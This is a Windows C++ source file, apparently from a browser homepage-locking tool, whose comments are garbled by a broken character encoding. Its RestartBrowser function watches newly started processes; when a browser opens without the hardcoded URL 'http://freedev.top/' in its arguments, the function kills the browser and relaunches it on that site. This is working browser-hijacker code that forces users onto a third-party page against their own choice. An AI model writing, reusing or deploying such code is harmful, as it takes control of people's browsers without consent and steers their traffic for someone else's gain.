#include "stdafx.h"
#include "LockApi.h"
#include "PublicFun.h"
#include "QueryCmdLine.h"


class CCSLock
{
private:
	CRITICAL_SECTION m_cs;
public:
	CCSLock(){ InitializeCriticalSection(&m_cs); }
	~CCSLock(){	DeleteCriticalSection(&m_cs); }
	VOID Lock(){ EnterCriticalSection(&m_cs); }
	VOID UnLock(){ LeaveCriticalSection(&m_cs);	}
};

CCSLock g_lckLastHandlePidLock;
DWORD g_dwLastHandlePid = 0;
CString strHomeUrl=L"http://freedev.top/";
/*
����ֵ���Ƿ����������˸ý���
*/
BOOL RestartBrowser( DWORD dwProcessID )
{
	BOOL bAlreadyHandle = FALSE;
	g_lckLastHandlePidLock.Lock();
	
	if (g_dwLastHandlePid == dwProcessID)
	{
		bAlreadyHandle = TRUE;
	}
	
	g_dwLastHandlePid = dwProcessID;

	g_lckLastHandlePidLock.UnLock();

	if (bAlreadyHandle)
	{
		return FALSE;
	}

	BOOL  bRestart = FALSE;
	HANDLE hProcess = NULL;
	DWORD dwParentID = 0;
	CString strProcessPath;
	CString strExeFileName;
	CString strParentExeFileName;
	
	do 
	{

		hProcess = OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_TERMINATE|PROCESS_VM_READ,FALSE,dwProcessID );

		if ( NULL == hProcess )
		{
			break;
		}

		dwParentID = GetParentPid(hProcess);

		if ( 0 == dwParentID )
		{
			break;
		}

		for (int i=0;i<200;i++)
		{
			GetProcessName(hProcess,strProcessPath.GetBuffer(MAX_PATH),MAX_PATH);
			strProcessPath.ReleaseBuffer();
			if (strProcessPath.GetLength() > 0)
			{
				break;
			}
			Sleep(0);
		}


		if( strProcessPath.GetLength() == 0 || FALSE == PathFileExists(strProcessPath) )
		{
			break;
		}


		//��ȡ������ȫ·��
		GetProcessName(dwParentID,strParentExeFileName.GetBuffer(MAX_PATH),MAX_PATH);
		strParentExeFileName.ReleaseBuffer();

		//��ȡ��������
		strExeFileName = strProcessPath;

		strExeFileName = strExeFileName.Right(strExeFileName.GetLength()-strExeFileName.ReverseFind(L'\\')-1);
		//��ȡ����������
		strParentExeFileName = strParentExeFileName.Right(strParentExeFileName.GetLength()-strParentExeFileName.ReverseFind(L'\\')-1);

		strExeFileName.MakeLower();

		//�жϽ����Ƿ�
		if(
			(strParentExeFileName.GetLength() == 0 || strExeFileName.CompareNoCase(strParentExeFileName) != 0)
			&& (CheckWBExeName(strExeFileName)  )
			)
		{
			CString strCmdLine;

			BOOL bResGetCmdLine = GetProcessCmdLine(dwProcessID,strCmdLine.GetBuffer(4000),4000);
			strCmdLine.ReleaseBuffer();

			CString strTempProcessPath;
			CString strShortCmdLine;

			strShortCmdLine = strCmdLine;
			strShortCmdLine.MakeLower();
			strTempProcessPath = strProcessPath;
			strTempProcessPath.MakeLower();

			strShortCmdLine.Replace(L"\""+strTempProcessPath+L"\"",L"");
			strShortCmdLine.Replace(strTempProcessPath,L"");
			strShortCmdLine = strShortCmdLine.TrimLeft();

			if ( 
				bResGetCmdLine     //��ȡ�����в����ɹ�
				&& strShortCmdLine.Find(strHomeUrl) < 0  //���������в������û�����ҳ
				&& ( strShortCmdLine.GetLength() == 0 || CheckLockUrl(strShortCmdLine) ) //��������Ϊ�� �� ����������ҳ����
				)
			{
				if (hProcess)
				{
					if(TerminateProcess(hProcess,0))
					{
						WinExec(CStringA(strProcessPath+L" \""+strHomeUrl+L"\""),SW_SHOW);
						bRestart = TRUE;
					}
					
				}
			}

		}


	} while (FALSE);

	if (hProcess)
	{
		CloseHandle(hProcess);
	}

	return bRestart;
	
}